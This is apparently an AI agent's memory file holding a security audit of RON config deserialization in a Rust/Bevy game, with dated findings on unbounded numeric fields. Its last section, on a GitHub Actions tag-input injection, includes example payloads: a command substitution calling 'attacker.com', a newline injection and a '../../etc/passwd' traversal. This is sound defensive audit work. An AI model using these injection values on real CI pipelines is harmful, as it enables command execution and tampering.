---
name: ron_deserialization_patterns
description: Confirmed safe RON deserialization patterns and production panic surface audit
type: project
---

Audited 2026-03-19 (develop, commit 7256360). Updated 2026-03-20 (feature/overclock-trigger-chain) to add chip/overclock RON patterns. Updated 2026-03-21 (develop, post-SpeedBoost refactor) to add SpeedBoost.multiplier finding. Updated 2026-03-21 (feature/invariant-self-tests) to add new scenario runner debug fields. Updated 2026-03-22 (feature/wave-3-offerings-transitions) to add Wave 3 transition config and chip offering weight findings. Updated 2026-03-23 (Wave 4 audit) to add EvolutionRecipe/EvolutionIngredient findings and CI workflow finding.

## Summary

All RON parsing uses the `ron` 0.12 crate via `ron::de::from_str` (typed deserialization with
serde-derived `Deserialize` impls). No custom deserializers. No call site has unvalidated
`from_str` on runtime user input.

## Production path — via Bevy asset system

All game data files are loaded via `RonAssetPlugin` + `bevy_asset_loader` using hard-coded asset
paths (declared in `DefaultsCollection` with `#[asset(path = "...")]` macros). There is no runtime
path construction using user input.

Font paths from RON (`font_path`, `title_font_path`, `menu_font_path`) are passed to
`asset_server.load()`. These paths come from Bevy config RON files, not from user input, and
Bevy's asset server restricts paths to the assets directory. No path traversal risk in practice.

## Production path — scenario runner

The scenario runner uses `fs::read_to_string` + `ron::de::from_str` on scenario files discovered
by walking `scenarios/` at a compile-time-pinned path (`env!("CARGO_MANIFEST_DIR")/scenarios`).
Malformed RON files cause an error log + skip, not a panic (`discovery.rs:73-75` uses `.ok()?`).

## Test-only panics

All `expect()`/`unwrap()` on RON parsing in `cells/resources.rs`, `run/node/definition.rs`,
`breaker/resources.rs`, `bolt/resources.rs`, `chips/definition.rs`, etc. are inside
`#[cfg(test)] mod tests` blocks. They do not execute at runtime.

## Warning: RON hp/regen_rate not validated at runtime

`CellTypeDefinition.hp` and `CellBehavior.regen_rate` are deserialized from `.cell.ron` files
without bounds checks in the asset loader path. A `.cell.ron` with `hp: -1.0` or
`regen_rate: Some(999999.0)` would load silently and cause downstream logic issues. Test code
validates `hp > 0.0` but only in `#[cfg(test)]`.

**Status as of 2026-03-23 audit:** Still unvalidated. No runtime validation added yet.

**How to apply:** On future audits, check whether validation has been added to the runtime
asset-loaded path (the system that processes `CellTypeAsset` events and populates `CellTypeRegistry`).

## Warning: TriggerChain stacking fields have no bounds validation (added 2026-03-20)

`TriggerChain::Shockwave.base_range`, `range_per_level`, `MultiBolt.base_count`, `count_per_level`,
`Shield.base_duration`, `duration_per_level`, and `stacks` are all deserialized from `.overclock.ron`
files (and `initial_overclocks` in `.scenario.ron`) without any bounds check.

Concrete risks:
- `base_range: 1e30` in a shockwave hits all cells in the scene simultaneously. Safe at the entity
  level (handle_cell_hit dedup prevents double CellDestroyed), but all cells destroyed in one frame.
- `base_count: u32::MAX` in MultiBolt queues a huge number of bolt spawns — potential hang/OOM.
- `AmpEffect::DamageBoost(f32)` accepts negative values. `DamageBoost(-2.0)` makes shockwave damage
  negative (`BASE_BOLT_DAMAGE * (1 + (-2.0)) < 0`), which heals cells via `take_damage`. Cells
  with `hp = max` would never be destroyed — node completion impossible.

**Status as of 2026-03-23:** All unvalidated. First-party data only, no external input path.
OnPerfectBump → OnImpact nesting means deeply nested chains are author-controlled. RON parser
recursion limit (~128) provides a practical cap on chain depth.

**How to apply:** On future audits, check for runtime validation added to the chip asset loader
path and to `CellHealth::take_damage` (negative amount guard).

## Warning: TriggerChain::SpeedBoost.multiplier has no bounds validation (added 2026-03-21)

`TriggerChain::SpeedBoost { multiplier: f32 }` is deserialized from `.archetype.ron` files without
any bounds check. The handler in `src/behaviors/effects/speed_boost.rs` applies `bolt_velocity.value
*= *multiplier` directly.

Concrete risks:
- `multiplier: 0.0` collapses velocity to zero. The `speed > 0.0` floor guard (`line 57`) correctly
  skips re-normalizing a zero vector (uses `normalize_or_zero`), so no NaN — but the bolt becomes
  motionless and the game soft-locks.
- `multiplier: -1.0` reverses the velocity direction. The `speed > 0.0` floor guard only checks
  magnitude, not sign, so a negative multiplier passes through. The bolt now travels in the
  opposite direction. The `BoltInBounds` invariant and OOB detection should eventually catch it, but
  this is an authored foot-gun.
- `multiplier: 1e10` hits the `max_speed` clamp and is safe (no panic, no NaN). Max-speed clamp
  path is exercised by test `handle_speed_boost_clamps_to_max_speed`.

**Status as of 2026-03-23:** Unvalidated. First-party data only. All production RON files use
safe positive values (1.1, 1.5). The zero-velocity path is explicitly covered by test
`handle_speed_boost_zero_velocity_remains_zero` and does not panic. Scenario invariant
`BoltSpeedInRange` would catch a motionless bolt at runtime.

**How to apply:** On future audits, check if a `multiplier > 0.0` assertion has been added to the
archetype asset loader path or inside `handle_speed_boost`.

## Warning: scenario runner debug fields have no bounds validation (added 2026-03-21, feature/invariant-self-tests)

New fields in `DebugSetup` and `MutationKind` (scenario runner only, not game crate):
- `DebugSetup.node_timer_remaining: Option<f32>` — no bounds check; negative values are intentional (timer_negative self-test).
- `DebugSetup.bolt_velocity: Option<(f32, f32)>` — no magnitude bounds check; large values intentional for bolt_speed_out_of_range self-test.
- `DebugSetup.extra_tagged_bolts: Option<usize>` — no upper bound; `usize::MAX` would OOM.
- `MutationKind::SpawnExtraEntities(usize)` — no upper bound; same OOM risk.

All of these are in the scenario runner developer tool — `.scenario.ron` files are first-party only.
No runtime user input path. Acceptable risk identical to prior TriggerChain stacking fields.

**Status as of 2026-03-23:** Unvalidated. First-party data only. Same category as TriggerChain stacking fields.

**How to apply:** On future audits, verify no external path to `.scenario.ron` loading has been added
(e.g., a flag to load a scenario from an arbitrary filesystem path provided by the user).

## Wave 3: TransitionDefaults fields — no bounds validation (added 2026-03-22, feature/wave-3-offerings-transitions)

`TransitionDefaults` in `src/fx/transition.rs` has `out_duration: f32` and `in_duration: f32` deserialized from RON (via `GameConfig` derive macro) without any bounds check.

Concrete risks:
- `out_duration: 0.0` causes a divide-by-zero in `animate_transition` at `transition.rs:148`:
  `let progress = 1.0 - (timer.remaining / timer.duration);`. When `timer.duration == 0.0`,
  this produces `NaN` (not a panic — Rust `f32` division by zero yields `±inf` or `NaN`).
  `NaN` then flows into `Val::Percent(NaN * 100.0)` in the Sweep branch, causing an undefined
  layout result. In the Flash branch, `bg_color.0.with_alpha(NaN)` produces invisible/undefined
  visuals. The state machine still completes (the `timer.remaining <= 0.0` guard fires on the
  first frame), so this is a visual glitch rather than a hard lock.
- `out_duration: -1.0` causes the timer to expire immediately on the first update (remaining
  starts at duration = -1.0, then remaining -= dt makes it even more negative, triggering the
  `<= 0.0` guard on the first frame). No hang, but skips the animation entirely.
- `out_duration: 1e30` produces a duration so long it never expires — hard lock (game stuck in
  TransitionOut/TransitionIn forever).

**Note:** `TransitionDefaults` is NOT in `DefaultsCollection` — it is not loaded from a RON file
at runtime. `TransitionConfig` is always seeded from `TransitionConfig::default()` (hardcoded
defaults). There is no `.transition.ron` file in assets/ and no asset path in `DefaultsCollection`.
The RON deserialization risk is **latent** — it would only become active if someone adds a
`defaults.transition.ron` asset path in the future.

**Status as of 2026-03-23:** Unvalidated but latent — no RON file loaded at runtime. The divide-
by-zero path in `animate_transition` is a real risk if a transition RON config file is ever added.

**How to apply:** On future audits, check whether `TransitionDefaults` has been added to
`DefaultsCollection` (i.e., a `.transition.ron` file and an `#[asset(path = ...)]` field). If so,
the `out_duration == 0.0` divide-by-zero becomes active and should be fixed.

## Wave 3: ChipSelectDefaults weight/rarity fields — no bounds validation (added 2026-03-22)

New fields on `ChipSelectDefaults` in `src/screen/chip_select/resources.rs`:
- `rarity_weight_common/uncommon/rare/legendary: f32` — base weights for weighted random selection
- `seen_decay_factor: f32` — multiplier for pool depletion
- `offers_per_node: usize` — number of chips offered per node
- `rarity_color_*_rgb: [f32; 3]` — display-only color values

All use `#[serde(default)]` so missing fields fall back to hardcoded safe values. The
`defaults.chipselect.ron` file does NOT include these new fields (as of 2026-03-22 — only the
original 7 fields are present), so all production runs use the default values.

Concrete risks:
- `rarity_weight_common: 0.0` + all other weights 0.0 — `WeightedIndex::new` receives all-zero
  weights. `draw_offerings` in `offering.rs:72` already handles this correctly:
  `let Ok(dist) = WeightedIndex::new(&weights) else { break; }` — breaks the loop cleanly with
  whatever was drawn so far. Zero-weight pool returns empty offerings, not a panic.
- `seen_decay_factor: 0.0` — zeroes out the weight of any previously seen chip permanently
  (it will never be offered again). Intended range is (0.0, 1.0]. A value of 0.0 is
  functionally the "never offer again" behavior, which `record_offered_with_0_0_factor_zeroes_weight`
  tests explicitly. Not a panic.
- `offers_per_node: usize::MAX` — `draw_offerings` clamps to `count.min(pool.len())` at line 66.
  Pool size is bounded by the chip registry (first-party data). No OOM risk.
- `seen_decay_factor: 2.0` (> 1.0) — amplifies weight of seen chips rather than decaying. A
  chip offered many times would become increasingly likely. Authored foot-gun but no panic.

**Status as of 2026-03-23:** Unvalidated, but no production RON includes these fields — all use
`#[serde(default)]` defaults. The offering algorithm gracefully handles all degenerate inputs
(empty pool, zero weights, `count > pool.len()`). Lower security priority than prior findings.

**How to apply:** On future audits, check if the new weight fields have been added to
`defaults.chipselect.ron`. If so, verify they include authoring guidance (positive, <= 1.0 for
decay) to prevent foot-guns.

## Wave 4: EvolutionIngredient.stacks_required — no bounds validation (added 2026-03-23)

`EvolutionIngredient.stacks_required: u32` is deserialized from `.chip.ron` / `.evolution.ron`
files (loaded as a `Bevy Asset` via `EvolutionRecipe`) without any bounds check.

Concrete risks:
- `stacks_required: 0` — `eligible_evolutions()` checks `inventory.stacks(name) >= 0`, which is
  always true for a `u32`. Any recipe with a zero-stack ingredient is permanently eligible,
  regardless of inventory state. The evolution can be triggered for "free" with no ingredients held.
  The consumption loop in `handle_chip_input.rs:77` iterates `0..0`, does nothing, and removes no
  stacks. This is a silent authoring error, not a panic.
- `stacks_required: u32::MAX` — `eligible_evolutions` would require the player to hold
  `u32::MAX` stacks of a chip, which is impossible (chip max_stacks is also u32 but bounded by
  design). The recipe would never appear as eligible. No panic, just an unreachable recipe.

No `.evolution.ron` files exist in `assets/` yet. The `EvolutionRegistry` is populated entirely
from test code at this time. Risk is latent until authored evolution RON files are added.

**Status as of 2026-03-23:** Unvalidated. No production evolution RON files exist. Latent risk.

**How to apply:** On future audits, check if `.evolution.ron` files have been added to assets/.
If so, verify `stacks_required > 0` is either enforced in the asset loader or documented as an
authoring constraint.

## Wave 4: CI release workflow — workflow_dispatch tag input injection risk (added 2026-03-23)

In `.github/workflows/release.yml`, the `resolve-tag` job runs a bash script that directly
interpolates `${{ github.event.inputs.tag }}` into a `run:` shell command:

```yaml
echo "tag=${{ github.event.inputs.tag }}" >> "$GITHUB_OUTPUT"
```

This pattern is a known GitHub Actions injection vector. If the tag input contains shell
metacharacters (e.g., `v1.0.0$(curl attacker.com)` or `v1.0.0\nAPPROVED=true`), the expression
is evaluated as shell code before being written to `$GITHUB_OUTPUT`.

However, for this repo:
- `workflow_dispatch` is a manually triggered event — only repository collaborators with write
  access can trigger it. There is no public/unauthenticated input path.
- The tag is then used as a shell variable `$TAG` (not re-interpolated as `${{ ... }}`) in all
  downstream steps, which is safe.
- The primary concrete risk is path traversal via the tag used in artifact directory names
  (e.g., `breaker-${{ env.TAG }}-macos-arm64`). A tag like `../../etc/passwd` would cause
  `mkdir -p`, `cp`, and `zip` to operate on unexpected paths. In practice, `workflow_dispatch`
  is restricted to write-access users.

**Status as of 2026-03-23:** Low risk given restricted trigger access. The fix would be to quote
the input and validate it matches `v*` pattern before use.

**How to apply:** On future audits, verify whether the workflow has been updated to validate the
tag input format (e.g., `if [[ ! "$TAG" =~ ^v[0-9] ]]; then exit 1; fi`).
